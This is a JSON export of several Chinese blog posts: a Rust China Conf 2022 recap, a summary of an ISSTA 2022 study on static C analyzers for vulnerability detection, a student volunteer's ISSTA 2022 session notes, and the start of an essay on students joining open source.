Fuzzer 自身的漏洞，其提供的 trait 系统也能让 Fuzzer 更加开箱即用，避免引入额外的代码和人工成本。\n 复杂 Rust 开源项目的维护\nRobert Yan， Near Proctol 工程师\n 主讲人维护着代码行数超过 17 万的开源项目 NEAR，2021年开发者活跃度增长了四倍，本场分享可以说是维护 Rust 大型开源项目的经验心得，其中一些建议并不局限于 Rust 项目，所有开源项目都可以借鉴。\n为项目维护一份简短的 architecture 文档可以让开发者快速上手，其中可包括：\n 鸟瞰图，描绘整个项目的结构 代码地图（Code Map），简洁地描述主要模块之间的关系，列出文件名即可而无需维护链接，显式地指出架构不变量（architectural invariants）  Rust 的包管理器 Cargo 对于小项目来说有很好的默认值，但对于有一定规模的项目来说并没有严格的规范，较为灵活，对于10万-100万行的项目，更推荐扁平结构而不是树形层级。\nRust 项目的构建时间普遍较长，这不止耗费机器资源，还会让开发者因等待编译而进行上下文切换，付出精力成本，也影响对项目的第一印象。而优化构建速度并不遵循二八定律，当编译时间长到一定程度后，并不是修改关键少数几行就能够大大加快编译速度的。 解决构建问题的银弹只有持续优化，平时就关注 CI 的构建时间，尽可能限制在 10 分钟内。在构建时可使用 --timings 选项分析哪些项目影响编译用时，阅读 Cargo.lock 观察是否有不必要依赖。\n在编写测试代码时也要注意避免一些误区，让测试的基础设施具有可扩展性，详细内容可见官方回放。\n分会场：Rust 语言研究与应用 这个分会场虽然围绕 Rust 语言，但说是安全专场也没问题，从代码混淆，模糊测试，再到编码规范，可以看成是安全开发流程中不断左移的三个阶段。\n 基于LLVM Rust代码混淆设计与实现\n赵禅，蚂蚁集团基础安全部安全专家\n C/C++ 开发的程序经常会使用代码混淆增大逆向难度，而随着 Rust 被越来越多的人使用，对 Rust 代码进行混淆也很有必要。Rust 大量使用 LLVM 作为其编译链工具，而现有的混淆工具大多都是作为 LLVM Pass 来提供混淆功能，其中最著名的便是 OLLVM，但其基于 LLVM 4.0 进行开发，与 Rust 不兼容，赵老师及其团队便自行设计实现了基于 LLVM 的 Rust 代码混淆系统。\n赵老师首先回顾了 LLVM 基本架构和 rustc 编译源码过程，介绍了虚假控制流和控制流平坦化这两种常见的混淆技术，并以 Web Assembly 代码混淆为例进行讲解。\n为了评估混淆系统的可靠性，在 RustCrypto 等库上开启全局混淆进行测试，发现并解决了一些兼容性问题，还给出了两个具体案例分析。\n混淆对性能和生成文件的体积也会有一定影响，使用 MD5 操作进行评估，在不同混淆级别下的执行速度做了曲线图对比，详情见官方回放。\n Rust API可靠性分析与验证\n姜剑峰，蚂蚁集团高级工程师\n Rust 语言结合静态检查与动态检查来实现内存安全，但语言本身提供的这些机制并不足以保证 API 的可靠性：\n而常见的可靠性分析方法也都有其局限：\n其中模糊测试技术已得到了较普遍的应用，上午的主会场中陈鹏老师就分享了如何用 Rust 从零开始实现 Fuzzer，而姜老师在复旦大学 Artisan-Lab 读研期间发表于 ASE 2021 的论文 RULF: Rust Library Fuzzing via API Dependency Graph Traversal 则是通过合成 API 调用代码来测试 Rust Library，值得一提的是这个工作基于 rustdoc 来提取 API 的签名信息，也算是主会场第一个分享「Rustdoc：你可以用它做什么」的真实案例，详情可见论文或官方回放。\n 你为什么需要「Rust 编码规范」\n张汉东，独立企业咨询师\n 作为国内知名的 Rust 布道者，张汉东老师致力于推广统一的 Rust 编码规范，目前《Rust 编码规范》中文版 V 1.0 Beta 版已经发布试行，希望能够翻译推广到国外，详情可见官方回放。\n","date":"2022-08-01T09:20:48+08:00","permalink":"https://chinggg.github.io/post/rustchinaconf2022/","tags":["会议","Rust"],"title":"Rust China Conf 2022 快速复盘"},{"categories":["论文"],"contents":"今天给大家推荐的是来自 ISSTA 2022 的一篇论文 An Empirical Study on the Effectiveness of Static C Code Analyzers for Vulnerability Detection，作者是慕尼黑工业大学的 Stephan Lipp, Sebastian Banescu 和 Alexander Pretschner，作者在真实 CVE 数据上对静态分析工具检测漏洞的效果做了详细的评估。\n论文地址：https://doi.org/10.1145/3533767.3534380\nArtifacts 地址：https://doi.org/10.5281/zenodo.6515687\n视频地址：https://www.youtube.com/watch?v=N6kePNadUV8\n研究动机 静态分析技术由于较低的部署成本和性能开销被广泛用于代码安全检测中，不过高误报率（high false positive rate）是其广为人知的一大缺点。至于其究竟能否有效地检测出代码中的漏洞，也就是假阴性率（false negetive rate）是否够低，则是另一个问题，之前较少有人研究。本文作者发现先前的工作都是在 Juliet Test Suite 这种人造数据集上进行，其中人为合成的漏洞本来就很容易发现，所以静态分析工具都宣称能达到 80% 左右的检测率。然而静态分析器在检测实际漏洞时的效果如何？不同的静态分析工具有有何优劣，组合起来在效果上有何提升？哪些种类的漏洞更容易被发现？这就是本文想要回答的三大问题。\n研究对象 静态分析器 作者将静态分析技术分成两类：语法分析（Syntactic Static Analysis）只是搜寻一些可能引入漏洞的代码，比如对memcpy这种函数的调用，所以对源代码应用即可，无需编译信息；语义分析（Semantic Static Analysis）需要考虑控制流或数据流信息，所以要先将源代码转换成抽象语法树、调用图和控制流图等更抽象的表示，尽管语义分析一般会伴随着不可判定性问题，但它可能发现更多复杂的漏洞。\n具体到本文中将研究的静态分析产品，作者选取了 6 款 C/C++ 静态分析工具，其中 5 款是开源的，即Flawfinder (FLF), Cppcheck (CPC), Infer (IFR), CodeChecker (CCH), CodeQL (CQL)，剩下一款隐去姓名的商业软件，称为 CommSCA (CSA)，它们都实现了 SOTA 的静态分析技术，被广泛用于之前的 benchmark 工作中。\n漏洞分类 Common Weakness Enumeration (CWE) 是一种漏洞分类系统，每种漏洞类型都被赋予唯一的编号，不同类型之间还可具有树形层级关系，顶部的 CWE 更多代表抽象的 class，底部的 CWE 则表示更具体的漏洞 type，不同静态分析器中对漏洞的描述都可以被归到 CWE 体系中。\n因为 C 语言中很多漏洞都紧密关联，比如 double-free (CWE-415) 和 use-after-free (CWE-416) 非常接近，都属于 Expired Pointer Dereference (CWE-825)。有些静态分析器可能给出了接近但不完全相同的 CWE，这种情况应当算作成功识别，所以比较时粒度不能太细，作者根据 Goseva-Popstojanova 和 Perhinschi 的现有工作 把相近的 vulnerability types 归为 classes，最终确定了如下 5 个 CWE 大类：\n Improper Control of a Resource Through its Lifetime (CWE-664) Incorrect Calculation (CWE-682) Insufficient Control-Flow Management (CWE-691) Improper Check or Handling of Exceptional Conditions (CWE-703) Improper Neutralization (CWE-707)  需要注意，不是每种 CWE 都被所有静态分析器支持的。作者调研了各个静态分析器的文档，对于每个 CWE 大类，若文档中提到能检测该类别中一种具体的漏洞，就认为静态分析器支持该种 CWE 大类，最终得到如下 CWE 支持性表格：\n漏洞数据 现有工作基本都是基于 Juliet Test Suite 这种合成数据集，而真实 bug 的数据集数量较少且种类单一或根本就没指出漏洞类型，还好有 Magma 这个原本针对 fuzzer 设计的 benchmark 是从 CVE 报告构建而来，包含了118 个漏洞，还使用了 front-porting 技术，能把在老版本软件中已发现的 bug 插入到新版本中。\n本文除了利用 Magma 数据集，还额外包括了 binutils 和 FFmpeg 中的 81 个 non-front-ported 真实漏洞。\n实验设计 评估粒度 静态分析工具一般会标注代码中错误显现的位置而非漏洞产生的根源，而CVE 报告对 fault (root cause) 和 error (manifestation) 的呈现并不是非常的完整，比如有些 CVE 给出 patch 的 commit 记录，从中可发现 fault 的根本原因，而有些只是在文字描述中给出了 error 显现的位置，所以本文决定将漏洞位置的粒度设置在函数的层面上。\n为了确保评估结果有效，fault 和 error 应当出现在相同的函数中，否则对于只指出 fault 位置的 CVE 就无法判断静态分析是否检测成功，作者采用 Fault-Error Conformity (FEC) 这个指标，即对于某一漏洞，fault和 error 重叠的函数个数与 error 所在函数的个数之比，结果如下表：\n可以看到所有漏洞的 FEC 非 1 即 0，可能是因为本来多数漏洞就只有一处函数会显现 error，所以若 fault 与 error 位置相同即为 1，否则即为 0。\n表格中看出不同应用各个漏洞的 FEC 基本都为 1，这说明对于多数漏洞 fault 和 error 都出现在相同的函数，所以设置 function-level 的粒度是合理的。\n指标场景 本文设置了 Vuln. Detection Ratio 和 Marked Function Ratio 这两个指标：前者是检测到的漏洞与所有漏洞的数量之比，即召回率；后者是被标记的函数与所有函数的数量之比，可用来估算误报的程度。\n本文受 Thung 等人工作的启发，设置了四个不同的评估场景（scenario）来评判漏洞是否被检测成功，即是否需要比较漏洞种类确保符合，是否要检测出漏洞影响的所有函数，这样能调整松紧程度，从不同的角度检验静态分析器的效果。\n实验结果 RQ.1: Static Analyzer Effectiveness 从被测程序的角度看，Poppler, FFmpeg, 和 Libpng 的漏洞检出率很低，作者分析了可能的原因：Poppler 是的被测程序中唯一一个用 C++ 编写的，尽管本文所测得静态分析器都支持 C/C++，但主要关注的还是 C，对 C++ 只有最基本的支持；FFmpeg 是被测程序中最大的，足有四十余万行代码，很可能触发了静态分析器所能分析的深度上限；Libpng 则是 Table 3 中 FEC 相对最低的，其 error 和 fault 位置的差异可能导致了静态分析的低检出率。\n从分析工具的角度看，CommSCA, CodeQL 和 Flawfinder 表现最佳，Cppcheck, CodeChecker 和 Infer 表现最差，但即使是效果最好的 CommSCA 能检测出的漏洞也几乎不过半数。\nRQ.2: Effectiveness Increase by Analyzer Combinations 在不同场景下对多种静态分析工具进行组合搭配，在达到高检测率的同时尽可能使用更少的静态分析工具，结果表明最优的搭配一般能提升两三成的检测率，但同时会增加 15% 的误报可能，而且仍然有大概一半的漏洞无法被检出。\nRQ.3: Best vs. Worst Detected Vulnerabilitiess 实验结果表明 CWE-664（资源生命周期控制不当）和 CWE-703（异常条件检查或处理不当） 比 CWE-{682,707,691} 更容易被静态分析，表现最差的两类 CWE 恰好就是 Table 2 中被静态分析器支持最少的那两类，而即使是表现最好的的 CWE-{664,703} 也有近半未被静态分析检出。\n总结展望 作者称本文是未来对静态分析检测漏洞进行研究的基础，之后计划分析如此多漏洞无法被检测的深层的原因，以找到改进静态分析工具的方法并理解这类工具的普遍限制。\n","date":"2022-07-26T15:20:48+08:00","permalink":"https://chinggg.github.io/post/sca-vuln-detect/","tags":["学术","安全"],"title":"静态分析检测漏洞真的有效吗：An Empirical Study on the Effectiveness of Static C Code Analyzers for Vulnerability Detection"},{"categories":["记录"],"contents":"ISSTA (The International Symposium on Software Testing and Analysis) 是软件测试与分析方面最著名的国际会议之一，也是中国计算机学会推荐的A类国际学术会议（CCF-A）。由于疫情原因，原本计划在韩国大田市举办的 ISSTA 2022 在 7 月 18 至 22 日以线上形式开展，我有幸作为学生志愿者（student volunteer, SV）在线上参与了会议。\n会议由许多主题 session 组成，每个 session 会展示几篇论文，需要一到两名 SV 负责主持 Zoom 会议，依次介绍论文并播放作者提前录好的 15 分钟视频，视频放完后留几分钟时间进行 Q\u0026amp;A，让在场的论文作者回答观众的提问。\n本文会以时间顺序记录三天的 SV 经历，并对所展示的论文做出业余的介绍，如有错误还请多多包涵指正。\nDay1 感觉这一场中讨论的问题比较抽象，很多论文我之前连标题关键词都闻所未闻，连研究对象都没搞清楚的话整篇论文就不知所云了。\n00:20 - 01:40 Session 1-1: Oracles, Models, and Measurement D 这一段虽然无需做 SV，但为了熟悉节奏还是全程参与了。\n Combining Solution Reuse and Bound Tightening for Efficient Analysis of Evolving Systems\nClay Stevens University of Nebraska-Lincoln, Hamid Bagheri University of Nebraska-Lincoln\n 这篇文章被评为了 ACM SIGSOFT distingushed paper，应该是程序形式化验证方面的工作，可惜文中关键的概念如 relational bound, bound tightening 和 solution reuse 我都从未接触过，无法理解本文具体内容。\n Evolution-Aware Detection of Order-Dependent Flaky Tests\nChengpeng Li University of Texas at Austin, August Shi University of Texas at Austin\n Flaky test 是指软件测试中结果不可靠的测试，其结果时而 pass，时而 fail，本文第二作者 Prof. August Shi 在 UIUC 读博时的导师 Darko Marinov 似乎就在这方面颇有研究。本文重点关注由测试顺序不同导致的 order-dependent flaky test，这是最常见的三种 flaky test 之一，其原因是一些测试（polluter）会污染程序中的 shared state（比如测试类中的 static 变量），从而影响依赖这些状态的测试（victim），polluter 和 victim 的引入和最后的修复在时间上可能间隔很久。作者提到先前的工作 iDFlakies（查了下就是 August Shi 在 UIUC 读博期间发表）可以对一份代码用随机的顺序运行测试来检测 order-dependent flaky test，但因为无法预知何时产生 flaky test，在每次变动时都要运行检测，开销会很大，实际开发中经常运用 Regression Test Selection (RTS) 技术，分析代码的变化及其与测试间的依赖关系，只运行测试的对应一部分子集以减小开销。\n基于 RTS 技术，本文提出了 InclDFlakies 以更高效地检测新引入的 flaky tests，通过对代码类和测试类进行分析可以执行更少的测试，只要分析时间+运行更少测试的时间比 baseline iDFlakies 更短就是成功，实验结果确实如此。\n jTrans: Jump-Aware Transformer for Binary Code Similarity Detection\nHao Wang Tsinghua University, Wenjie Qu Huazhong University of Science and Technology, Gilad Katz Ben-Gurion University of the Negev, Wenyu Zhu Tsinghua University, Zeyu Gao University of Science and Technology of China, Han Qiu Tsinghua University, Jianwei Zhuge Tsinghua University, Chao Zhang Tsinghua University\n 看标题大概知道是用 transformer 做二进制代码相似性检测，内容没有细看。\n On the Use of Evaluation Measures for Defect Prediction Studies\nRebecca Moussa University College London, Federica Sarro University College London\n UCL 这位姐姐做的幻灯片真是我见过最精美的，图片、动效和字体有种手绘风，不过这样呈现的信息密度较低，而且光看幻灯片很难感知到整体和单页内容的结构，演讲者需要确保自己表达流畅层层引入，观众也要专注听讲才能跟上。与之对立的常见风格是把干货内容文字放在幻灯片中，演讲时照着念，这样就算口语不佳，在表意上也不会有大问题。\n参会当时光被其形式所震撼，没看懂具体内容，会后复盘了一下，其实就是对所有 defect prediction 工作中用到的 evaluation measures 进行调研，是对评价指标的评价。具体来说就是统计历年来 defect prediction 这一工作中用到的指标，比如 AUC, p-measure, recall, precision 等等，这些看起来只是统计学中的不同度量方法，但背后其实反映了在对研究进行评价时的多样性。正如作者在第一张幻灯片中所做的比喻，同一个方块从不同的 viewpoints 和 angles 上观察，既可能是 square 也可能是 diamond。不过对于 defect prediction 这一关键概念，作者只用一两页带过，之后都是在对不同 evaluation measures 被用到的次数做排序和分析，似乎把 defection prediction 换成其他任何研究问题都毫无违和感。总之结论就是，evaluation measures 的选择是在做研究时必须关注的大问题，现在的研究在评价指标选取上没有原理可依，只能部分地反映模型性能，会造成 data imbalance。\n02:00 - 03:00 Session 1-3: Oracles, Models, and Measurement A 这一段三篇论文和印度博士姐姐 Anurata Prabha Hridi 分担，第二个视频放完之后由我主持，有些紧张一度担心自己视频没放出声音，结束后立马得到对方的肯定。\n Using Pre-trained Language Models to Resolve Textual and Semantic Merge Conflicts (Experience Paper)\nJialu Zhang Yale University, Todd Mytkowicz Microsoft Research, Mike Kaufman Microsoft Corporation, Ruzica Piskac Yale University, Shuvendu K. Lahiri Microsoft Research\n 合并冲突（merge conflicts）是一个经常发生却容易被忽视的问题，每一个小小的合并冲突就可能拖慢几小时到数天的开发进度，以 Edge 浏览器为例，三个月内就可以产生超过 800 个 commits 仅仅用来解决合并冲突，平均每个冲突就需要花费一个专家半小时来解决，浪费大量人力。用预训练的模型来自动处理可以节省成本，并且可扩展性更强。\n Metamorphic Relations via Relaxations: An Approach to Obtain Oracles for Action-Policy Testing\nHasan Ferit Eniser MPI-SWS, Timo P. Gros Saarland University, Germany, Valentin Wüstholz ConsenSys, Jörg Hoffmann Saarland University and DFKI, Germany, Maria Christakis MPI-SWS\n 之前都没听说过 metamorphic relation 是什么，整体看上去是理论性较强的工作，relaxation 这个概念是获得 oracle 的关键，幻灯片中阐释的比较清楚。\n作者还举了具体案例比如公路超车，登陆月球等，实现并开源了 pi-fuzz 框架，针对以上案例对 Metamorphic Oracle (MMOracle) 的效果进行了评估。\nQ\u0026amp;A 环节没人提问，为防冷场我问了个愚蠢的问题：发现了哪些 real-world vulnerabilities？作者回答说是在模拟器上实验的，可能这个领域就是如此吧。\n An Extensive Study on Pre-trained Models for Program Understanding and Generation\nZhengran Zeng Southern University of Science and Technology, Hanzhuo Tan Southern University of Science and Technology, The Hong Kong Polytechnic University, Haotian Zhang , Jing Li, Hanzhuo Tan Southern University of Science and Technology, The Hong Kong Polytechnic University, Haotian Zhang The Hong Kong Polytech University, Jing Li The Hong Kong Polytech University, Yuqun Zhang Southern University of Science and Technology, Lingming Zhang University of Illinois at Urbana-Champaign\n UIUC 张令明老师组里的工作，评估了当前的预训练模型在程序理解和生成（Program Understanding and Generation, PUG）上的效果和鲁棒性，还发现了这些预训练模型都易受对抗样本的攻击，最后给出了一些 practical guidelines。这个问题还是比较新颖且具有现实意义的，像 GitHub Copilot 就是基于大规模预训练模型的产品，或许就有被攻击的风险。\nDay2 前一天熬夜导致今天精力不足，基本是印度老哥 Sumit 带飞，我在下面鼓掌。\n00:20 - 01:20 Session 1-6: Concurrency, IoT, Embedded A  A Large-Scale Empirical Analysis of the Vulnerabilities Introduced by Third-party Components in IoT Firmware\nBinbin Zhao Georgia Institute of Technology, Shouling Ji Zhejiang University, Jiacheng Xu Zhejiang University, Yuan Tian University of Virginia, Qiuyang Wei Zhejiang University, Qinying Wang Zhejiang University, Chenyang Lyu Zhejiang University, Xuhong Zhang Zhejiang University, Changting Lin Binjiang Institute of Zhejiang University, Jingzheng Wu Institute of Software, The Chinese Academy of Sciences, Raheem Beyah Georgia Institute of Technology\n 佐治亚理工赵彬彬博士和浙大纪守领老师，软件所吴敬征老师等人的工作，大规模分析 IoT 固件中由第三方组件引入的漏洞，没有细看，大致印象是数据图表很多。\n Detecting Multi-Sensor Fusion Errors in Advanced Driver-Assistance Systems\nZiyuan Zhong Columbia University, Zhisheng Hu Baidu Security, Shengjian Guo Baidu Security, Xinyang Zhang Baidu Security, Zhenyu Zhong Baidu USA, Baishakhi Ray Columbia University\nUnderstanding Device Integration Bugs in Smart Home System\nTao Wang Institute of Software Chinese Academy of Sciences, Kangkang Zhang Institute of Software Chinese Academy of Sciences, Wei Chen Institute of Software Chinese Academy of Sciences, Wensheng Dou Institute of Software Chinese Academy of Sciences, Jiaxin Zhu Institute of Software Chinese Academy of Sciences, Jun Wei Institute of Software Chinese Academy of Sciences\n 这两篇论文都是探讨某一物联网场景下的某种特定问题，之前没有了解过。\n02:00 - 02:40 Session 1-8: Concurrency, IoT, Embedded D  Deadlock Prediction via Generalized Dependency\nJinpeng Zhou University of Pittsburgh, Hanmei Yang University of Massachusetts Amherst, John Lange Oak Ridge National Lab/University of Pittsburgh, Tongping Liu University of Massachusetts Amherst\nPrecise and Efficient Atomicity Violation Detection for Interrupt-driven Programs via Staged Path Pruning\nChao Li Beijing Institute of Control Engineering and Beijing Sunwise Information Technology Ltd, Rui Chen Beijing Institute of Control Engineering and Beijing Sunwise Information Technology Ltd, Boxiang Wang Xidian University and Beijing Sunwise Information Technology Ltd, Tingting Yu Beijing Institute of Control Engineering and Beijing Sunwise Information Technology Ltd, Dongdong Gao Beijing Institute of Control Engineering and Beijing Sunwise Information Technology Ltd, Mengfei Yang China Academy of Space Technology\n 这两篇论文都是探讨如何检测程序中一些的并发问题，比如死锁和原子性违反，没有细看。\nDay3 期待已久的 fuzzing 专场，不过 SV 工作有点小意外，原本该主持 Zoom 会议的 John 持续失联，因此两个 Session 全部由我独自主持，还好 Sonal Mahajan 和 Donghwan Shin 两位 SV Co-Chair 一直在鼓励我并在台下随时提供支持。感觉今天会议气氛有点冷，每篇论文都没有人开麦提问，都是我自己提问来试图暖场。\n23:00 - 00:00 Session 1-9: Fuzzing and Friends A  Almost Correct Invariants: Synthesizing Inductive Invariants by Fuzzing Proofs\nSumit Lahiri Indian Institute Of Technology Kanpur, Subhajit Roy IIT Kanpur\n 本文作者 Sumit Lahiri 就是昨天和我一场的 SV，这篇论文讲的是用 fuzzing 来生成 inductive invariants，我们知道可以用霍尔三元组来进行程序验证，但对于包含循环的程序，需要归纳出 loop invariants（循环不变式，算法导论开篇就讲过这个概念） 来构建正确性证明。\n现有的工作比如 Code2Inv 对程序进行逻辑编码并使用定理证明器来合成 inductive loop invariants，但问题是程序中可能包含 opaque operations，无法获得其形式语义，比如外部函数和系统调用等，这时基于逻辑编码的现有工作就失效了。而本文就使用 proof fuzzing 来检查生成 inductive loop invariants 的正确性，开发了工具 ACHAR，通过设置 Reach Oracle 来判断 invariant 是否合法。最终实验结果在性能上确实稍好于 Code2Inv。\n因为从 ACHAR 的结构图中看到可以用 AFL 作为后端，我提问该如何理解 proof fuzzing 中的覆盖导向，Sumit 的回答语速较快没太听清，似乎是说没覆盖导向应该也可以。\n另外 ACHAR 在梵语中是 immovable 和 invariant 的意思，在其他工作几乎清一色命名为 XXXFuzz 很容易撞车的今天，这名字显得很有文化。\n MDPFuzz: Testing Models Solving Markov Decision Processes\nQi Pang HKUST, Yuanyuan Yuan HKUST, Shuai Wang HKUST\n 港科大王帅老师组里的工作，听完后大概只知道是用强化学习的 reward 作为 fuzz 的反馈，Q\u0026amp;A 环节问了下 initial seed 是怎么选的，对 fuzz 效果有何影响，作者回答说初始环境是随机分布，选取的时候要避免在开始就 crash 掉。\n SnapFuzz: High-Throughput Fuzzing of Network Applications\nAnastasios Andronidis Imperial College London, Cristian Cadar Imperial College London\n 这篇文章比较接近传统意义上的 fuzz 所以还算比较好理解，早在 5 月知乎上就有对这篇 SnapFuzz 的解读，可能是因为其在性能上十几倍的提升实在亮眼，毕竟天下武功唯快不破。作者 Anastasios Andronidis 的展示非常清晰，从 fuzz 的基本概念讲起，提到网络 fuzz 的痛点是通信协议的 awareness 和 statefulness，需要对副作用进行隔离和重置，又介绍了 SOTA 工作如 AFL Net，其仍然需要大量人力用于配置网络参数和重置状态，性能也较差。\n作者举了 dcmqrscp 这个例子，fuzzer 需要被配置在初始化和接发网络包的时候进行等待，每次文件读写操作也需要维持文件系统的状态。\n为了提升 fuzzer 性能，作者使出了浑身解数，下图展示了 SnapFuzz 的关键组成部分\nQ\u0026amp;A 环节我先提问 SnapFuzz 运用二进制重写等技术是否会导致一些兼容性问题，老哥打开摄像头爽快回答 \u0026ldquo;That\u0026rsquo;s a really good question\u0026rdquo;，估计他早已料到会有这种问题，在论文的 limitations 这节里已经阐述了一些特殊场景下可能的问题，大部分情况下还是正常工作的。看时间还够我又问了下是否支持对二进制的 fuzz 和是否能基于 QEMU 对 IoT 固件中的网络服务进行 fuzz，老哥也耐心回答说因为基于 AFLNet 开发的，可以通过源码插桩获得更多覆盖率信息，直接对二进制 fuzz 应该也可以，但没有测试过到底能否在 QEMU 上做 fuzz。\n00:40 - 01:20 Session 1-11: Fuzzing and Friends D  Efficient Greybox Fuzzing of Applications in Linux-based IoT Devices via Enhanced User-mode Emulation\nYaowen Zheng Nanyang Technological University; Beijing Key Laboratory of IOT Information Security Technology, Institute of Information Engineering, CAS, China;, Yuekang Li Nanyang Technological University, Cen Zhang Nanyang Technological University, Hongsong Zhu Beijing Key Laboratory of IOT Information Security Technology, Institute of Information Engineering, CAS, China; School of Cyber Security, University of Chinese Academy of Sciences, China, Yang Liu Nanyang Technological University, Limin Sun Beijing Key Laboratory of IOT Information Security Technology, Institute of Information Engineering, CAS, China; School of Cyber Security, University of Chinese Academy of Sciences, China\n 对基于 Linux 的 IoT 程序进行灰盒 Fuzz，一般都是使用 QEMU 模拟，分为 user-mode 和 full-system 两种模式：前者直接将系统调用转发给宿主机，性能更好但兼容性差；后者模拟了整个系统兼容性好，可性能太差故不常用于实践。之前的 SOTA 工作是采用混合模拟的 FIRM-AFL，在 user-mode 执行常规代码，系统调用则转发给 full-system emulation，但当 program under test (PUT) 频繁发起系统调用时，性能仍然受到影响。\n本文提出了 EQUAFL，关键思路是设置执行环境以让 PUT 的系统调用能直接传给宿主机，这样 PUT 仍在 user-mode 执行，避免 full system emulation 的开销。主要分两步，先在 full system emulation 下执行并观察一些能设置程序执行正常环境的关键行为，比如启动变量的设置，配置文件的动态生成和 NVRAM 配置等，之后在 user-mode 重放这些行为并进行 fuzz。\n观察记录不同的行为也需要相应的手段，以启动变量的设置为例，argv 和 env 可能存在各种地方，不过我们知道每当新进程启动，内核都会调用 do_execve 函数，通过分析 Linux 内核源码可以找到哪些地方能 dump 出 argv 和 env 的值。\n会议时没太理解技术细节，感觉理论上确实做到了兼容和性能的统一，实验结果也是远远超过 SOTA，于是 Q\u0026amp;A 环节我就问这个工作 workload 怎样，observation 和 replay 都能自动化进行还是需要人工。作者回答说实验的时候只是针对了几个特定的设备，对于每种设备来说自动化程度应该还是挺高的。\n TensileFuzz: Facilitating Seed Input Generation in Fuzzing via String Constraint Solving\nXuwei Liu Purdue University, Wei You Renmin University of China, Zhuo Zhang Purdue University, Xiangyu Zhang Purdue University\n 普渡大学张翔宇老师组里的工作，fuzz 中 seed 的生成算是个老大难问题，直接影响代码覆盖率，作者提到现有的工作主要是符号执行和基于梯度的搜索以及 hybrid fuzzing，但在这些技术在某种场合也无法奏效。作者以 ZIP 格式为例，说明了 hybrid fuzzer 无法执行过全部的检查，而 string solver 更适合求解这些约束。\n整体 workflow 如下图所示，后面看了论文里的图比这张还更复杂。\n会议时我没有太明白 input field detection 是怎么做的，因为作者举例是用 ZIP 这种明确的格式，就提问是否用到 dictionary 来表示文件结构，作者回答 \u0026ldquo;This is a good question. But actually not.\u0026rdquo; 最后我理解下来 fields 应该就是把输入当成字符串，通过 SMT Solver 来求解的，并不需要在开始给出结构，要弄懂原理可以看论文中的公式推导。\n实验结果如上图，TensileFuzz 在除了 lame 之外的所有程序上表现更优，因为 lame 这个 MP3 编码器中有很多算术关系，Angora 这种基于梯度的 fuzzer 会更加高效。\n总结 作为学生志愿者没有物质上的回报，却要付出 10h+ 的时间，因为时差要连续三天熬夜导致身心俱疲。\n但为了理解会议内容，增进和作者的互动，我也走马观花看了一些论文，接触了之前完全不了解的方向。\n与此同时，我也算第一次参与了学术会议的组织，与会者观看直播时的岁月静好，其实背后都是志愿者的负重前行。\n感谢 Sonal Mahajan 和 Donghwan Shin 两位 SV Co-Chair 以及其他 SV 对我的鼓励和支持，尽管我们素未相识，却能互相信任，一起努力保障线上会议的正常开展，这本身就是一件很有意思的事。我也曾在开源世界感受过这种弱连接的神奇，故而非常珍惜和世界各地的研究者交流的机会，或许也正是因为之前的开源经历，我才能以本科生的身份入选为志愿者，希望之后的自己能一直保持这种开放的心态，这可能和代码工作本身的开源同样重要。\n","date":"2022-07-22T17:20:48+08:00","permalink":"https://chinggg.github.io/post/issta2022/","tags":["学术","软工"],"title":"ISSTA 2022 学生志愿者云参会小记"},{"categories":["随笔"],"contents":"“青春才几年，疫情占三年”，大一就体验过家里蹲的我，在大三又尝到了宿舍蹲的滋味，不知不觉就到了毕业季，刷朋友圈看见高中老师带的新一批学生也吃上了散伙饭，这才意识到离开高中已有三年了，而如今的我和高中时的我，有何区别呢？\n对大部分高中生来说，教室是全天候的学习场所，老师在讲台上传道授业，全班同学只需遵循老师的教诲，便能获得不错的成绩，最终体现在高考的分数上。而到了大学阶段，尤其是开始学习专业课后，讲堂的作用似乎开始减弱，上课似懂非懂，作业云里雾里，代码靠 CSDN，考试靠 B 站大学，已成了许多大学生的常态。疫情之下，网课和线上教学更是一地鸡毛，对大学生活的憧憬最终变成了迷茫和自我否定。\n如果你也有这样的感觉，那么开源或许能帮你走出困境，从心态上的转变到治学方法的改进，由内及外，开启不一样的大学生活。\n反客为主  无论做什么，我们都需要给自己一个理由。每天迫于生活压力，毫无主见地忙碌着，可称得上人生一大悲哀。\n在迈进大学校门的时候，我们面临的最大问题是：为什么要上课？也许是因为问题本身太过浅显，以至于我们甚至懒于思考。但我们之中又有谁真正有效地思考过这个问题呢？\n 这里引用了 《上海交通大学生存手册》 中的一段话，类似地，在进入计算机学院的时候，我们也该问问自己：为什么要选择计算机专业？\n分流排名高，家长亲友劝进，若因为这些原因而选择学习计算机，只能让自己处于被动。而真正对计算机充满兴趣的人会发现，与其端坐讲堂之中谨遵老师教诲，不如反客为主，走出课堂积极探索计算机世界的奥妙。而开源就是一个充满生机的集市，任何人都既可以是消费者，也可以是生产者，学习不光是被动接受的过程，而是需要主动探索、贡献和创造。在集市上淘宝，不是等待其他人告诉你一个最优解，也不是闷头发问盲目索取，而要主动调研市场，伺机而动，淘回来的东西在遵守开源协议的情况下加工加工，就可以自己摆摊吆喝了。疫情可以让讲堂蒙灰，却无法让开源的集市停摆，哪怕相隔万里，也能与世界相连。\n从一到多 高中时老师总说 “上了大学就轻松了”，而当时的我们全然不知高考只是起点，等到了大学才被告知还有绩点一说，若想要保研，之后的四年中，不仅每一场考试都要认真对待，就连选择哪个老师上的哪门课也有讲究。慢慢地我们还会发现，无论是升学还是就业，都少不了和分数打交道，我们的评价体系习惯用量化的分数来衡量一个人，不知不觉中，我们自己也成了单向度的人，从一开始就打听着终南捷径，却不知今后到底该走向何方。\n面对这些外在的指标和压力，我们必须保持头脑清醒，大学四年给了每个人充足的时间探索不同的领域，而那一串苍白的分数，在你毕业之时就将作废。\n作为普通学校的学生，难以触及名校所能提供的丰富资源，所幸参与开源没有门槛，任何人都能以一种舒适的方式获得成长的多样性。相比于传统意义上的各种竞赛，开源目前还是蓝海，十四五规划将开源提上议程后，包括中科院软件所和中国计算机学会在内的各大机构也纷纷举办活动支持学生参与开源，不仅计算机专业的学生可以参与代码开发，其他专业的学生也能以不同的身份参与社区治理，从设计运营到沟通组织，都能发挥自己的特长。\n开放共赢 